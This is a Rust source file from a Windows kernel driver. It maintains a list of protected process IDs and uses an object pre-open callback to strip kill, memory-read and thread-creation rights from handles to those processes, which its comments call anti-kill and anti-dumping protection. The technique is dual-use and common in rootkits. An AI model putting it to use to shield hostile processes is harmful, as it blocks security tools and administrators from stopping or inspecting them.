use {
    alloc::vec::Vec,
    spin::{Lazy, Mutex},
    common::{
        structs::TargetProcess, 
        vars::MAX_PID
    },  
    winapi::um::winnt::{
        PROCESS_CREATE_THREAD, PROCESS_TERMINATE, 
        PROCESS_VM_OPERATION, PROCESS_VM_READ
    },
};

use wdk_sys::{
    STATUS_UNSUCCESSFUL,
    PEPROCESS, PROCESS_DUP_HANDLE,
    ntddk::PsGetProcessId, STATUS_QUOTA_EXCEEDED,
    NTSTATUS, OB_PRE_OPERATION_INFORMATION, 
    STATUS_DUPLICATE_OBJECTID, STATUS_SUCCESS,
    _OB_PREOP_CALLBACK_STATUS::{OB_PREOP_SUCCESS, Type}
};

pub struct ProcessCallback;

/// Handle for the process callback registration.
pub static mut CALLBACK_REGISTRATION_HANDLE_PROCESS: *mut core::ffi::c_void = core::ptr::null_mut();

/// List of target PIDs protected by a mutex.
static TARGET_PIDS: Lazy<Mutex<Vec<usize>>> = Lazy::new(|| 
    Mutex::new(Vec::with_capacity(MAX_PID))
); 

impl ProcessCallback {
    /// Method for adding the list of processes that will have anti-kill / dumping protection.
    ///
    /// # Arguments
    /// 
    /// * `pid` - The identifier of the target process (PID) to be hidden.
    ///
    /// # Returns
    /// 
    /// * A status code indicating the success or failure of the operation.
    pub fn add_target_pid(pid: usize) -> NTSTATUS {
        let mut pids = TARGET_PIDS.lock();

        if pids.len() >= MAX_PID {
            return STATUS_QUOTA_EXCEEDED;
        }

        if pids.contains(&pid) {
            return STATUS_DUPLICATE_OBJECTID;
        }

        pids.push(pid);

        STATUS_SUCCESS
    }

    /// Method for removing the list of processes that will have anti-kill / dumping protection.
    ///
    /// # Arguments
    /// 
    /// * `pid` - The identifier of the target process (PID) to be hidden.
    ///
    /// # Returns
    /// 
    /// * A status code indicating the success or failure of the operation.
    pub fn remove_target_pid(pid: usize) -> NTSTATUS {
        let mut pids = TARGET_PIDS.lock();

        if let Some(index) = pids.iter().position(|&x| x == pid) {
            pids.remove(index);
            STATUS_SUCCESS
        } else {
            STATUS_UNSUCCESSFUL
        }
    }

    /// Enumerate Processes Protect.
    /// 
    /// # Returns
    /// 
    /// * A status code indicating success or failure of the operation.
    pub unsafe fn enumerate_protection_processes() -> Vec<TargetProcess> {
        let mut processes: Vec<TargetProcess> = Vec::new();
        let process_info = TARGET_PIDS.lock();
        for i in process_info.iter() {
            processes.push(TargetProcess {
                pid: *i,
                ..Default::default()
            });
        }

        processes
    }

    /// The object (process) pre-operation callback function used to filter process opening operations.
    /// This function is registered as a callback and is called by the operating system before a process opening operation is completed.
    ///
    /// # Arguments
    /// 
    /// * `_registration_context` - Pointer to record context (Not used).
    /// * `info` - Pointer to an `OB_PRE_OPERATION_INFORMATION` structure that contains information about the process's pre-opening operation.
    ///
    /// # Returns
    /// 
    /// * A status code indicating the success or failure of the operation.
    pub unsafe extern "C" fn on_pre_open_process(
        _registration_context: *mut core::ffi::c_void,
        info: *mut OB_PRE_OPERATION_INFORMATION,
    ) -> Type {
        if (*info).__bindgen_anon_1.__bindgen_anon_1.KernelHandle() == 1 {
            return OB_PREOP_SUCCESS;
        }

        let process = (*info).Object as PEPROCESS;
        let pid = PsGetProcessId(process) as usize;
        let pids = TARGET_PIDS.lock();

        if pids.contains(&pid) {
            let mask = !(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE | PROCESS_TERMINATE);
            (*(*info).Parameters).CreateHandleInformation.DesiredAccess &= mask;
        }

        OB_PREOP_SUCCESS
    }
}